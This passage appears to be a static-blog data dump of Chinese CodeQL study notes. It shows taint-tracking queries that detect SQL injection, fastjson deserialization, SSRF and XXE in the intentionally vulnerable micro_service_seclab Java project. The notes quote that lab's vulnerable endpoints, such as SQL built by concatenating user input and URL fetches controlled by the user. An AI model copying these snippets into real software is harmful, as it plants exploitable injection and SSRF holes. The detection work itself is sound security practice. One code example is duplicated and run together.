class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * A QLDoc comment that describes the class `Digit`.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Digit</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">int</span> &#123;  <span class=\"comment\">// A short one-line comment</span></span><br><span class=\"line\">  Digit() &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span> in [<span class=\"number\">0</span> .. <span class=\"number\">9</span>]</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">  A standard multiline comment, perhaps to provide</span></span><br><span class=\"line\"><span class=\"comment\">  additional details, or to write a TODO comment.</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Name-resolution-解析\"><a href=\"#Name-resolution-解析\" class=\"headerlink\" title=\"Name resolution(解析)\"></a>Name resolution(解析)</h1><h2 id=\"Names\"><a href=\"#Names\" class=\"headerlink\" title=\"Names\"></a>Names</h2><p>处理一个name首先在当前模块的命名空间中查找名称。</p>\n<p>如果是import语句。name resolution会更加复杂，看下面这个例子。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javascript</span><br></pre></td></tr></table></figure>\n\n<p>编译器首先检查库模块javascript.qll，再采取下面说到的那些步骤。如果失败，它会检查在Example.ql的模块命名空间中定义的名为javascript的explicit module。</p>\n<h2 id=\"Qualified-references\"><a href=\"#Qualified-references\" class=\"headerlink\" title=\"Qualified references\"></a>Qualified references</h2><p>限定引用是一种模块表达式，使用 . 作为文件路径分隔符。它只能在 import 语句中使用，用于导入由相对路径定义的库模块。比如我们Example.ql有如下一个import语句。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> examples.security.MyLibrary</span><br></pre></td></tr></table></figure>\n\n<p><strong>1. 当前目录查找</strong> 编译器首先从包含当前 Example.ql 文件的目录中查找目标文件 examples&#x2F;security&#x2F;MyLibrary.ql</p>\n<p><strong>2. 查询目录查找</strong> 查找相对路径 examples&#x2F;security&#x2F;MyLibrary.qll。如果查询目录未配置或路径中未找到目标文件，继续下一步。查询目录是第一个包含qlpack.yml文件的目录。（或者，在老版本中，是一个名为queries.xml的文件。）</p>\n<p>**3. 库路径查找 ** 查看qlpack.yml 文件中的 libraryPathDependencies 设置</p>\n<p><strong>4. 查找失败</strong> 如果还找不到编译会报错。</p>\n<h2 id=\"Selections\"><a href=\"#Selections\" class=\"headerlink\" title=\"Selections\"></a>Selections</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;module_expression&gt;::&lt;name&gt;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Example\"><a href=\"#Example\" class=\"headerlink\" title=\"Example\"></a>Example</h3><p><strong>CountriesLib.qll</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Countries</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">string</span> &#123;</span><br><span class=\"line\">  Countries() &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span> = <span class=\"string\">&quot;Belgium&quot;</span></span><br><span class=\"line\">    <span class=\"type\">or</span></span><br><span class=\"line\">    <span class=\"variable\">this</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;France&quot;</span></span><br><span class=\"line\">    <span class=\"type\">or</span></span><br><span class=\"line\">    <span class=\"variable\">this</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;India&quot;</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">module</span> M &#123;</span><br><span class=\"line\">  <span class=\"keyword\">class</span> <span class=\"title class_\">EuropeanCountries</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Countries</span> &#123;</span><br><span class=\"line\">    EuropeanCountries() &#123;</span><br><span class=\"line\">      <span class=\"built_in\">this</span> = <span class=\"string\">&quot;Belgium&quot;</span></span><br><span class=\"line\">      <span class=\"type\">or</span></span><br><span class=\"line\">      <span class=\"variable\">this</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;France&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">class</span> <span class=\"title class_\">Countries</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">string</span> &#123;</span><br><span class=\"line\">  Countries() &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span> = <span class=\"string\">&quot;Belgium&quot;</span></span><br><span class=\"line\">    <span class=\"type\">or</span></span><br><span class=\"line\">    <span class=\"variable\">this</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;France&quot;</span></span><br><span class=\"line\">    <span class=\"type\">or</span></span><br><span class=\"line\">    <span class=\"variable\">this</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;India&quot;</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">module</span> M &#123;</span><br><span class=\"line\">  <span class=\"keyword\">class</span> <span class=\"title class_\">EuropeanCountries</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Countries</span> &#123;</span><br><span class=\"line\">    EuropeanCountries() &#123;</span><br><span class=\"line\">      <span class=\"built_in\">this</span> = <span class=\"string\">&quot;Belgium&quot;</span></span><br><span class=\"line\">      <span class=\"type\">or</span></span><br><span class=\"line\">      <span class=\"variable\">this</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;France&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以用如下方式使用</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> CountriesLib</span><br><span class=\"line\"></span><br><span class=\"line\">from M::EuropeanCountries ec</span><br><span class=\"line\">select ec</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> CountriesLib::M</span><br><span class=\"line\"></span><br><span class=\"line\">from EuropeanCountries ec</span><br><span class=\"line\">select ec</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Namespaces\"><a href=\"#Namespaces\" class=\"headerlink\" title=\"Namespaces\"></a>Namespaces</h2><p>命名空间。和其它语言比较像，不过多解释。</p>\n<h3 id=\"Global-namespaces\"><a href=\"#Global-namespaces\" class=\"headerlink\" title=\"Global namespaces\"></a>Global namespaces</h3><h3 id=\"Local-namespaces\"><a href=\"#Local-namespaces\" class=\"headerlink\" title=\"Local namespaces\"></a>Local namespaces</h3><h1 id=\"QL-language-specification\"><a href=\"#QL-language-specification\" class=\"headerlink\" title=\"QL language specification\"></a>QL language specification</h1><p>语言规范太多了，这里就不细讲了。</p>\n<p><a href=\"https://codeql.github.com/docs/ql-language-reference/ql-language-specification/\">https://codeql.github.com/docs/ql-language-reference/ql-language-specification/</a></p>\n"},{"title":"codeql实战练习-micro_service_seclab","_content":"\n不会的类要积极的去 CodeQL standard libraries 里面翻看。然后多积累，多记录。\n\n# 构建数据库\n\n项目地址 https://github.com/l4yn3/micro_service_seclab\n\n`codeql database create ~/xxxxxx/micro-service-seclab-database  --language=\"java\"  --command=\"mvn clean package -Dmaven.test.skip=true\" --source-root=./micro-service-seclab/`\n\n`codeql database create D:\\codeqls\\CodeQL-Practice --language=\"java\" --source-root=D:\\codeqls\\micro_service_seclab --command=\"mvn clean package -Dmaven.test.skip=true\"`\n\n# 查看sql注入的点\n\n>  `RemoteFlowSource`   : A data flow source of remote user input.\n\nhttps://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/dataflow/FlowSources.qll/type.FlowSources$RemoteFlowSource.html\n\n比如下面这个\n\n```java\n@RequestMapping(value = \"/one\")    \npublic List<Student> one(@RequestParam(value = \"username\") String username) {    \n    return indexLogic.getStudent(username);    \n}\n```\n\n```java\n import java\n import semmle.code.java.dataflow.FlowSources\n import semmle.code.java.security.QueryInjection\n import DataFlow::PathGraph\n \n class VulConfig extends TaintTracking::Configuration {\n      VulConfig() { this = \"SqlInjectionConfig\"}\n     \n     override predicate isSource(DataFlow::Node src) {\n         src instanceof RemoteFlowSource\n     }\n     \n     override predicate isSink(DataFlow::Node sink) {\n         exists(Method method, MethodAccess call |\n             method.hasName(\"query\")\n             and\n             call.getMethod() = method and\n             sink.asExpr() = call.getArgument(0)\n         )\n     }\n \n }\n \n from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink\n where config.hasFlowPath(source, sink)\n select source.getNode(), source, sink, \"source\"\n```\n\n# 测试\n\n在开始下面的这些之前。可以先来一个测试案例，然后看看官方的standard libraries 感受一下。\n\n```java\nimport java\n \nfrom Method method ,MethodAccess call\nwhere call.getMethod() = method\nselect method,call,call.getArgument(0),call.getArgument(0).getType()\n```\n\n# 删除int类型参数\n\n这个方法的参数类型是 `List<Long>`，不会存在注入漏洞。\n这说明我们的规则里，对于 `List<Long>` ，甚至 `List<Integer>` 类型都会产生误报，source 误把这种类型的参数涵盖了。\n我们需要采用 `isSanitizer` 来消除这种情况。\n\n![image-20241129140751142](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241129140751142.png)\n\n三个类对应的类型如下\n\nPrimitiveType   > `boolean`, `byte`, `short`, `char`, `int`, `long`, `float`, and `double`.\n\nBoxedType  > `Boolean`, `Byte`, `Short`, `Character`, `Integer`, `Long`, `Float`, and `Double`.\n\nNumberType >  A (reflexive, transitive) subtype of `java.lang.Number`.\n\nParameterizedType 这个类，官方的一些解释。\n\n> A parameterized type is an instantiation of a generic type(泛型类), where each formal type variable has been replaced with a type argument.\n>\n> For example, `List<Number>` is a parameterization of the generic type `List<E>`, where `E` is a type parameter.\n\n```java\noverride predicate isSanitizer(DataFlow::Node node) {\n    node.getType() instanceof PrimitiveType or\n    node.getType() instanceof BoxedType or\n    node.getType() instanceof NumberType or\n    exists(ParameterizedType pt| \n        node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType\n     )\n}\n```\n\n# 解决漏报\n\n我们发现，如下的SQL注入并没有被CodeQL捕捉到。\n\n```java\npublic List<Student> getStudentWithOptional(Optional<String> username) {\n        String sqlWithOptional = \"select * from students where username like '%\" + username.get() + \"%'\";\n        //String sql = \"select * from students where username like ?\";\n        return jdbcTemplate.query(sqlWithOptional, ROW_MAPPER);\n}\n```\n\n假如 Optional 这种类型的使用没有在 CodeQL 的语法库里，我们需要强制让 `username` 流转到`username.get()`，这样 `username.get()` 就变得可控了。这样应该就能识别出这个注入漏洞了。\n\n```java\nimport java\nimport semmle.code.java.dataflow.FlowSources\nimport semmle.code.java.security.QueryInjection\nimport DataFlow::PathGraph\n\npredicate isTaintedString(Expr expSrc, Expr expDest) {\n    exists(Method method, MethodAccess call, MethodAccess call1|\n        expSrc = call1.getArgument(0) and expDest = call and call.getMethod() = method\n        and method.hasName(\"get\") and method.getDeclaringType().toString() = \"Optional<String>\"\n        and call1.getArgument(0).getType().toString() = \"Optional<String>\"\n        )\n}\n\nclass VulConfig extends TaintTracking::Configuration {\n     VulConfig() { this = \"SqlInjectionConfig\"}\n    \n    override predicate isSource(DataFlow::Node src) {\n        src instanceof RemoteFlowSource\n    }\n    \n    override predicate isSink(DataFlow::Node sink) {\n        exists(Method method, MethodAccess call |\n            method.hasName(\"query\")\n            and\n            call.getMethod() = method and\n            sink.asExpr() = call.getArgument(0)  // sink.asExpr() 是一个方法，用于将一个 sink 转换成一个表达式。这个方法通常用于在查询中使用 sink，因为查询需要将 sink 转换成表达式才能进行分析。\n        )\n    }\n\n    override predicate isSanitizer(DataFlow::Node node) {\n        node.getType() instanceof PrimitiveType or\n        node.getType() instanceof BoxedType or\n        node.getType() instanceof NumberType or\n        exists(ParameterizedType pt| \n            node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType\n         )\n    }\n\n    override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) {\n        isTaintedString(node1.asExpr(), node2.asExpr())\n    }\n\n}\n\nfrom VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink\nwhere config.hasFlowPath(source, sink)\nselect source.getNode(), source, sink, \"source\"\n```\n\n# fastjson\n\n```java\n import java\n import semmle.code.java.dataflow.FlowSources\n import semmle.code.java.security.QueryInjection\n import DataFlow::PathGraph\n \n class FastjsonVulConfig extends TaintTracking::Configuration {\n     FastjsonVulConfig() { this = \"fastjson\" }\n     \n     override predicate isSource(DataFlow::Node src) {\n         src instanceof RemoteFlowSource\n     }\n     \n     override predicate isSink(DataFlow::Node sink) {\n         exists(Method method, MethodAccess call|\n             method.hasName(\"parseObject\")\n             and\n             call.getMethod() = method and\n             sink.asExpr() = call.getArgument(0)\n             )\n     }\n }\n \n from FastjsonVulConfig fastjsonVul, DataFlow::PathNode source, DataFlow::PathNode sink\n where fastjsonVul.hasFlowPath(source, sink)\n select source.getNode(), source, sink, \"source\"\n```\n\n# SSRF\n\n RequestForgerySink 类。\n\n> A data flow sink for server-side request forgery (SSRF) vulnerabilities.\n\n```java\nimport java\nimport semmle.code.java.dataflow.FlowSources\nimport semmle.code.java.security.QueryInjection\nimport DataFlow::PathGraph\nimport semmle.code.java.security.RequestForgeryConfig\n\nclass SSRFVulConfig extends TaintTracking::Configuration {\n\t\tSSRFVulConfig() { this = \"SSRFVulConfig\" }\n    \n    override predicate isSource(DataFlow::Node src) {\n        src instanceof RemoteFlowSource\n    }\n    \n    override predicate isSink(DataFlow::Node sink) {\n    sink instanceof RequestForgerySink\n    }\n }\n from SSRFVulConfig ssrfVulConfig, DataFlow::PathNode source, DataFlow::PathNode sink\n where ssrfVulConfig.hasFlowPath(source, sink)\n select source.getNode(), source, sink, \"source\"\n```\n\n# ssrf 漏报处理1\n\n## 漏报原因排查\n\n但是其实ssrf 提供了5个路由都可以可以进行ssrf的，但是只排查出了3个。首先看看 two 这个路由 \n\n```java\n@RequestMapping(value = \"/two\")\npublic String Two(@RequestParam(value = \"url\") String imageUrl) {\n    try {\n        URL url = new URL(imageUrl);\n        HttpResponse response = Request.Get(String.valueOf(url)).execute().returnResponse();\n        return response.toString();\n    } catch (IOException var1) {\n        System.out.println(var1);\n        return \"Hello\";\n    }\n}\n```\n\n`imageUrl→url = new URL(imageUrl)→String.valueOf(url)→Request.Get(String.valueOf(url))`\n\n在 `two` 接口中的代码有问题的地方如下，用到了 `String.valueOf(url)`,正常情况下程序不会觉得 `String.valueOf()` 方法返回的仍然是污点。因此我们需要修改 Config 中的 `isAdditionalTaintStep` 方法，将 `java.net.URL` 和 `String.valueOf(url)` 绑定。\n\n我们这里直接跟进RequestForgeryConfig 这个类看一看。\n\n![image-20241130010138565](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241130010138565.png)\n\n注意这个isAdditionalTaintStep。继续跟进propagatesTaint谓语。\n\n![image-20241130010703439](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241130010703439.png)\n\n## 处理方法1\n\n我们这里直接修改 RequestForgery.qll  源码。主要是14到24行，还有 第 47 行。\n\n```java\n/** Provides classes to reason about server-side request forgery (SSRF) attacks. */\n\nimport java\nimport semmle.code.java.frameworks.Networking\nimport semmle.code.java.frameworks.ApacheHttp\nimport semmle.code.java.frameworks.spring.Spring\nimport semmle.code.java.frameworks.JaxWS\nimport semmle.code.java.frameworks.javase.Http\nimport semmle.code.java.dataflow.DataFlow\nimport semmle.code.java.frameworks.Properties\nprivate import semmle.code.java.dataflow.StringPrefixes\nprivate import semmle.code.java.dataflow.ExternalFlow\n\n class TypeStringLib extends RefType {\n    TypeStringLib() { this.hasQualifiedName(\"java.lang\", \"String\") }\n  }\n\n class StringValue extends MethodAccess {\n    StringValue(){\n      this.getCallee().getDeclaringType() instanceof TypeStringLib and\n      this.getCallee().hasName(\"valueOf\")\n    }\n}\n\n/**\n * A unit class for adding additional taint steps that are specific to server-side request forgery (SSRF) attacks.\n *\n * Extend this class to add additional taint steps to the SSRF query.\n */\nclass RequestForgeryAdditionalTaintStep extends Unit {\n  /**\n   * Holds if the step from `pred` to `succ` should be considered a taint\n   * step for server-side request forgery.\n   */\n  abstract predicate propagatesTaint(DataFlow::Node pred, DataFlow::Node succ);\n}\n\nprivate class DefaultRequestForgeryAdditionalTaintStep extends RequestForgeryAdditionalTaintStep {\n  override predicate propagatesTaint(DataFlow::Node pred, DataFlow::Node succ) {\n    // propagate to a URI when its host is assigned to\n    exists(UriCreation c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)\n    or\n    // propagate to a URL when its host is assigned to\n    exists(UrlConstructorCall c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)\n    or \n      //处理String.valueOf(URL)\n    exists(StringValue c | c.getArgument(0) = pred.asExpr() | succ.asExpr() = c)\n  }\n}\n\nprivate class TypePropertiesRequestForgeryAdditionalTaintStep extends RequestForgeryAdditionalTaintStep\n{\n  override predicate propagatesTaint(DataFlow::Node pred, DataFlow::Node succ) {\n    exists(MethodAccess ma |\n      // Properties props = new Properties();\n      // props.setProperty(\"jdbcUrl\", tainted);\n      // Propagate tainted value to the qualifier `props`\n      ma.getMethod() instanceof PropertiesSetPropertyMethod and\n      ma.getArgument(0).(CompileTimeConstantExpr).getStringValue() = \"jdbcUrl\" and\n      pred.asExpr() = ma.getArgument(1) and\n      succ.asExpr() = ma.getQualifier()\n    )\n  }\n}\n\n/** A data flow sink for server-side request forgery (SSRF) vulnerabilities. */\nabstract class RequestForgerySink extends DataFlow::Node { }\n\nprivate class DefaultRequestForgerySink extends RequestForgerySink {\n  DefaultRequestForgerySink() { sinkNode(this, \"request-forgery\") }\n}\n\n/** A sanitizer for request forgery vulnerabilities. */\nabstract class RequestForgerySanitizer extends DataFlow::Node { }\n\nprivate class PrimitiveSanitizer extends RequestForgerySanitizer {\n  PrimitiveSanitizer() {\n    this.getType() instanceof PrimitiveType or\n    this.getType() instanceof BoxedType or\n    this.getType() instanceof NumberType\n  }\n}\n\nprivate class HostnameSanitizingPrefix extends InterestingPrefix {\n  int offset;\n\n  HostnameSanitizingPrefix() {\n    // Matches strings that look like when prepended to untrusted input, they will restrict\n    // the host or entity addressed: for example, anything containing `?` or `#`, or a slash that\n    // doesn't appear to be a protocol specifier (e.g. `http://` is not sanitizing), or specifically\n    // the string \"/\".\n    exists(this.getStringValue().regexpFind(\"([?#]|[^?#:/\\\\\\\\][/\\\\\\\\])|^/$\", 0, offset))\n  }\n\n  override int getOffset() { result = offset }\n}\n\n/**\n * A value that is the result of prepending a string that prevents any value from controlling the\n * host of a URL.\n */\nprivate class HostnameSantizer extends RequestForgerySanitizer {\n  HostnameSantizer() { this.asExpr() = any(HostnameSanitizingPrefix hsp).getAnAppendedExpression() }\n}\n\n```\n\n## 处理方法2\n\n或者不改写lib，直接改写 ql 查询语句。\n\n```java\nimport java\nimport semmle.code.java.dataflow.FlowSources\nimport semmle.code.java.dataflow.ExternalFlow\nimport DataFlow::PathGraph\nimport semmle.code.java.security.RequestForgeryConfig\n\nclass TypeStringLib extends RefType {\n  TypeStringLib() { this.hasQualifiedName(\"java.lang\", \"String\") }\n}\n\nclass StringValue extends MethodAccess {\n  StringValue(){\n    this.getCallee().getDeclaringType() instanceof TypeStringLib and\n    this.getCallee().hasName(\"valueOf\")\n  }\n}\n\nprivate class MyRequestForgeryAdditionalTaintStep extends RequestForgeryAdditionalTaintStep {\n  override predicate propagatesTaint(DataFlow::Node pred, DataFlow::Node succ) {\n    // propagate to a URI when its host is assigned to\n    exists(UriCreation c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)\n    or\n    // propagate to a URL when its host is assigned to\n    exists(UrlConstructorCall c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)\n    or \n    //处理String.valueOf(URL)\n    exists(StringValue c | c.getArgument(0) = pred.asExpr() | succ.asExpr() = c)\n  }\n}\n\nclass SSRFVulConfig extends TaintTracking::Configuration {\n  SSRFVulConfig() { this = \"first_modifySSRF\" }\n\n  override predicate isSource(DataFlow::Node source) {\n      source instanceof RemoteFlowSource and\n      // Exclude results of remote HTTP requests: fetching something else based on that result\n      // is no worse than following a redirect returned by the remote server, and typically\n      // we're requesting a resource via https which we trust to only send us to safe URLs.\n      not source.asExpr().(MethodAccess).getCallee() instanceof UrlConnectionGetInputStreamMethod\n    }\n\n   override predicate isSink(DataFlow::Node sink) {\n      sink instanceof RequestForgerySink\n   }\n\n   override predicate isAdditionalTaintStep(DataFlow::Node pred, DataFlow::Node succ) {\n      any(RequestForgeryAdditionalTaintStep r).propagatesTaint(pred, succ)\n    }\n\n\n}\nfrom SSRFVulConfig ssrfVulConfig, DataFlow::PathNode source, DataFlow::PathNode sink\nwhere ssrfVulConfig.hasFlowPath(source, sink)\nselect source.getNode(), source, sink, \"source\"\n```\n\n# ssrf 漏报处理2\n\n还有一个漏的。\n\n```java\n@RequestMapping(value = \"/three\")\npublic String Three(@RequestParam(value = \"url\") String imageUrl) {\n    try {\n        URL url = new URL(imageUrl);\n        OkHttpClient client = new OkHttpClient();\n        com.squareup.okhttp.Request request = new com.squareup.okhttp.Request.Builder().get().url(url).build();\n        Call call = client.newCall(request);\n        Response response = call.execute();\n        return response.toString();\n    } catch (IOException var1) {\n        System.out.println(var1);\n        return \"Hello\";\n    }\n}\n```\n\ncom.squareup.okhttp.Request request = new com.squareup.okhttp.Request.Builder().get().url(url).build();\n\n这种请求相对更复杂，因此需要自行构造规则。在这一条 ql 的语句当中有两个关键的定位锚点，一个是`url(url)`，一个是 `build()`，`url()` 确定是否引入污点，`build()` 确定sink的位置。结合这两者，进行检测 ql 的构造。先看一下这个的语法树AST。\n\n![image-20241130014216314](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241130014216314.png)\n\n这种链式结构调用在语法树中是包含的关系，当获取到最外层的 MethodAccess 时，可以使用 `getAChildExpr()` 方法返回其子语句，使用 `getAChildExpr+()` 可以递归返回全部子语句。结合前面说到的两个关键定位锚点，进行如下代码构造\n\n最终。效果。7-20 行 ，56 行\n\n```java\nimport java\nimport semmle.code.java.dataflow.FlowSources\nimport semmle.code.java.dataflow.ExternalFlow\nimport DataFlow::PathGraph\nimport semmle.code.java.security.RequestForgeryConfig\n\nMethodAccess url(MethodAccess ma,DataFlow::Node node){\n  exists( MethodAccess mc | mc = ma.getAChildExpr()| if mc.getCallee().hasName(\"url\") and mc.getArgument(0) = node.asExpr() then result = mc else result = url(mc,node)\n  )\n}\n\nMethodAccess m(DataFlow::Node node){\n  exists(\n      MethodAccess ma | ma.getCallee().hasName(\"build\") and ma.getCallee().getDeclaringType().hasName(\"Builder\") |result = url(ma,node)\n  )\n}\n\nclass TypeStringLib extends RefType {\n  TypeStringLib() { this.hasQualifiedName(\"java.lang\", \"String\") }\n}\n\nclass StringValue extends MethodAccess {\n  StringValue(){\n    this.getCallee().getDeclaringType() instanceof TypeStringLib and\n    this.getCallee().hasName(\"valueOf\")\n  }\n}\n\nprivate class MyRequestForgeryAdditionalTaintStep extends RequestForgeryAdditionalTaintStep {\n  override predicate propagatesTaint(DataFlow::Node pred, DataFlow::Node succ) {\n    // propagate to a URI when its host is assigned to\n    exists(UriCreation c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)\n    or\n    // propagate to a URL when its host is assigned to\n    exists(UrlConstructorCall c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)\n    or \n    //处理String.valueOf(URL)\n    exists(StringValue c | c.getArgument(0) = pred.asExpr() | succ.asExpr() = c)\n  }\n}\n\nclass SSRFVulConfig extends TaintTracking::Configuration {\n  SSRFVulConfig() { this = \"first_modifySSRF\" }\n\n  override predicate isSource(DataFlow::Node source) {\n      source instanceof RemoteFlowSource and\n      // Exclude results of remote HTTP requests: fetching something else based on that result\n      // is no worse than following a redirect returned by the remote server, and typically\n      // we're requesting a resource via https which we trust to only send us to safe URLs.\n      not source.asExpr().(MethodAccess).getCallee() instanceof UrlConnectionGetInputStreamMethod\n    }\n\n   override predicate isSink(DataFlow::Node sink) {\n      sink instanceof RequestForgerySink or  \n      //sink = URL对象\n      exists (m(sink))\n   }\n\n   override predicate isAdditionalTaintStep(DataFlow::Node pred, DataFlow::Node succ) {\n      any(RequestForgeryAdditionalTaintStep r).propagatesTaint(pred, succ)\n    }\n\n\n}\nfrom SSRFVulConfig ssrfVulConfig, DataFlow::PathNode source, DataFlow::PathNode sink\nwhere ssrfVulConfig.hasFlowPath(source, sink)\nselect source.getNode(), source, sink, \"source\"\n```\n\n\n\n# XXE\n\n```java\nimport java\nimport semmle.code.java.dataflow.FlowSources\nimport semmle.code.java.dataflow.ExternalFlow\nimport DataFlow::PathGraph\n\nclass XXEVulConfig extends TaintTracking::Configuration {\n  XXEVulConfig(){\n      this = \"XXEVulConfig\"\n  }\n\n  override predicate isSource(DataFlow::Node src) {\n      src instanceof RemoteFlowSource\n  }\n\n  override predicate isSink(DataFlow::Node sink) {\n      exists(Method method, MethodAccess call|\n          method.hasName(\"parse\") and\n          call.getMethod() = method and\n          sink.asExpr() = call.getArgument(0)\n          )\n  }\n}\n\nfrom XXEVulConfig xxeVulConfig, DataFlow::PathNode source, DataFlow::PathNode sink\nwhere xxeVulConfig.hasFlowPath(source, sink)\nselect source.getNode(), source, sink, \"source\"\n```\n\n\n\n","source":"_posts/codeql练习-micro_service_seclab.md","raw":"---\ntitle: codeql实战练习-micro_service_seclab\ntags:\n  - 代码审计\n  - myblog\n---\n\n不会的类要积极的去 CodeQL standard libraries 里面翻看。然后多积累，多记录。\n\n# 构建数据库\n\n项目地址 https://github.com/l4yn3/micro_service_seclab\n\n`codeql database create ~/xxxxxx/micro-service-seclab-database  --language=\"java\"  --command=\"mvn clean package -Dmaven.test.skip=true\" --source-root=./micro-service-seclab/`\n\n`codeql database create D:\\codeqls\\CodeQL-Practice --language=\"java\" --source-root=D:\\codeqls\\micro_service_seclab --command=\"mvn clean package -Dmaven.test.skip=true\"`\n\n# 查看sql注入的点\n\n>  `RemoteFlowSource`   : A data flow source of remote user input.\n\nhttps://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/dataflow/FlowSources.qll/type.FlowSources$RemoteFlowSource.html\n\n比如下面这个\n\n```java\n@RequestMapping(value = \"/one\")    \npublic List<Student> one(@RequestParam(value = \"username\") String username) {    \n    return indexLogic.getStudent(username);    \n}\n```\n\n```java\n import java\n import semmle.code.java.dataflow.FlowSources\n import semmle.code.java.security.QueryInjection\n import DataFlow::PathGraph\n \n class VulConfig extends TaintTracking::Configuration {\n      VulConfig() { this = \"SqlInjectionConfig\"}\n     \n     override predicate isSource(DataFlow::Node src) {\n         src instanceof RemoteFlowSource\n     }\n     \n     override predicate isSink(DataFlow::Node sink) {\n         exists(Method method, MethodAccess call |\n             method.hasName(\"query\")\n             and\n             call.getMethod() = method and\n             sink.asExpr() = call.getArgument(0)\n         )\n     }\n \n }\n \n from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink\n where config.hasFlowPath(source, sink)\n select source.getNode(), source, sink, \"source\"\n```\n\n# 测试\n\n在开始下面的这些之前。可以先来一个测试案例，然后看看官方的standard libraries 感受一下。\n\n```java\nimport java\n \nfrom Method method ,MethodAccess call\nwhere call.getMethod() = method\nselect method,call,call.getArgument(0),call.getArgument(0).getType()\n```\n\n# 